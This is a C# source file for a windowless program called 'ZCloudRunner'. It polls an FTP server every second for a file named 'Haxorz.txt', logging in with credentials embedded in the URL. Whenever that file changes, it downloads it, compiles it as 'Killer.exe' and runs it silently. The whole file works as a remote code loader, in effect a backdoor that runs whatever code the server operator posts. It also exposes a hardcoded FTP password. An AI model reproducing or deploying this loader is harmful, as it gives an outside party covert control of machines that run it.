using System;
using System.Windows.Forms;
using System.Net;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.IO;
using System.Threading;

namespace ZCloudRunner
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());
            new CloudRunner();
        }

    }

    public class CloudRunner
    {
        string AllTheData;
        DateTime LastDownloaded;
        Thread Prosessor;
        //string url = "http://stargateno1fan.tumblr.com/";
        string url = "ftp://server2436:drsoxen@calamity.minecraft-servers.com/Code/Haxorz.txt";

        delegate void SetTextCallback();

        public CloudRunner()
        {
            LastDownloaded = DateTime.Today;
            Processor();
        }

        #region Processor
        public void Processor()
        {
            while (true)
            {
                FtpWebRequest req = (FtpWebRequest)WebRequest.Create(new Uri(url));
                req.Method = WebRequestMethods.Ftp.GetDateTimestamp;
                try
                {
                    FtpWebResponse resp = (FtpWebResponse)req.GetResponse();


                    if (resp.LastModified != LastDownloaded)
                    {
                        WebRequest request = WebRequest.Create(url);
                        WebResponse response = request.GetResponse();

                        System.IO.StreamReader reader = new System.IO.StreamReader(response.GetResponseStream());

                        AllTheData = reader.ReadToEnd();

                        if (LastDownloaded != DateTime.Today)
                            CompileAndRun();
                        LastDownloaded = resp.LastModified;
                    }
                    resp.Close();
                }
                catch { }
                Thread.Sleep(1000);
            }
        }

        public string TumblrParser(string toParse)
        {
            string tempHead = toParse.Substring(toParse.IndexOf("</script>") + "</script>".Length);
            string tempBody = tempHead.Remove(tempHead.IndexOf("<!-- BEGIN TUMBLR CODE -->"));
            return tempBody;
        }
        #endregion

        #region Compiler
        public void CompileAndRun()
        {

            CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();
            ICodeCompiler myCodeCompiler = new CSharpCodeProvider().CreateCompiler();

            String[] referenceAssemblies = { "System.dll" };
            CompilerParameters cp = new CompilerParameters(referenceAssemblies, "Killer.exe");

            cp.ReferencedAssemblies.Add("system.dll");
            cp.ReferencedAssemblies.Add("system.xml.dll");
            cp.ReferencedAssemblies.Add("system.data.dll");
            cp.ReferencedAssemblies.Add("System.Runtime.Serialization.Formatters.Soap.dll");
            cp.ReferencedAssemblies.Add("system.drawing.dll");
            cp.ReferencedAssemblies.Add("System.Core.dll");
            cp.ReferencedAssemblies.Add("System.Xml.Linq.dll");
            cp.ReferencedAssemblies.Add("System.Web.Services.dll");
            cp.ReferencedAssemblies.Add("System.Runtime.Serialization.dll");
            cp.ReferencedAssemblies.Add("System.Windows.Forms.dll");

            cp.TreatWarningsAsErrors = false;

            cp.GenerateExecutable = true;

            cp.CompilerOptions = "/target:winexe /optimize";

            CompilerResults cr = myCodeCompiler.CompileAssemblyFromSource(cp, AllTheData);

            if (cr.Errors.Count == 0)
                System.Diagnostics.Process.Start("Killer.exe");

        }
        #endregion
    }
}
